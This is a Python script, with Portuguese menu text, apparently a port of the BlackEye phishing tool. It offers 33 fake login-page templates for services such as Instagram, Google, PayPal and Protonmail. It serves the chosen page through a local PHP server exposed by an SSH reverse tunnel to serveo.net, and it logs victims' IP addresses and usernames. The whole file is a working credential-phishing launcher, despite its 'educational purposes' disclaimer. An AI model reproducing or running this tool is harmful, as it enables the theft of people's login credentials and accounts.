import os, sys, subprocess

class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'

try:
    print(colors.RED + """
                        BlackEye Python

Programa Shell Original Criado por thelinuxchoice
Link para o Original: https://github.com/thelinuxchoice/blackeye

Diferenças:
    - Isto é escrito em Python
    - Usa o Serveo com um subdomínio personalizado

                        :: AVISO! ::

Eu e nem os desenvolvedores originais assumimos qualquer responsabilidade pelas ações
causadas pelo uso deste programa. Qualquer uso indevido ou dano causado pelo
Phishing-Python está no nome dos usuários. Use para FINS EDUCACIONAIS!
    """ + colors.END)

    print(colors.GREEN + """
                       Modelos disponíveis:

[1] Instagram          [2] Facebook            [3] Snapchat
[4] Twitter            [5] GitHub              [6] Google
[7] Spotify            [8] Netflix             [9] PayPal
[10] Origin            [11] Steam              [12] Yahoo!
[13] LinkedIn          [14] Protonmail         [15] Wordpress
[16] Microsoft         [17] IGFollowers        [18] eBay
[19] Pinterest         [20] CryptoCurrency     [21] Verizon
[22] DropBox           [23] Adobe ID           [24] Shopify
[25] FB Messenger      [26] GitLab             [27] Twitch
[28] MySpace           [29] Badoo              [30] VK
[31] Yandex            [32] devianART          [33] Custom

Por favor, escolha um número para o modelo de host:
    """ + colors.END)
    templates = {
    '1': 'instagram',
    '2': 'facebook',
    '3': 'snapchat',
    '4': 'twitter',
    '5': 'github',
    '6': 'google',
    '7': 'spotify',
    '8': 'netflix',
    '9': 'paypal',
    '10': 'origin',
    '11': 'steam',
    '12': 'yahoo',
    '13': 'linkedin',
    '14': 'protonmail',
    '15': 'wordpress',
    '16': 'microsoft',
    '17': 'igfollowers',
    '18': 'ebay',
    '19': 'pinterest',
    '20': 'cryptocurrency',
    '21': 'verizon',
    '22': 'dropbox',
    '23': 'adobeid',
    '24': 'shopify',
    '25': 'fbmessenger',
    '26': 'gitlab',
    '27': 'twitch',
    '28': 'myspace',
    '29': 'badoo',
    '30': 'vk',
    '31': 'yandex',
    '32': 'devianart',
    '33': 'create'
    }
    number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    if number == "18":
        print("Ebay atualmente não funciona. Escolha Outro..")
        exit()
    else:
        pass
    choice = templates[number]
    print("Carregando %s" % (choice))
    print("\nInsira um subdomínio personalizado")
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    print(colors.GREEN + "Iniciando o servidor no %s.serveo.net..." % (subdom))
    print("Os logs podem ser encontrados em sites/%s/ip.txt e sites/%s/usernames.txt" % (choice, choice) + colors.END)
    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
    p = subprocess.Popen(cmd_line, shell=True)
    out = p.communicate()[0]


except KeyboardInterrupt:
    pass
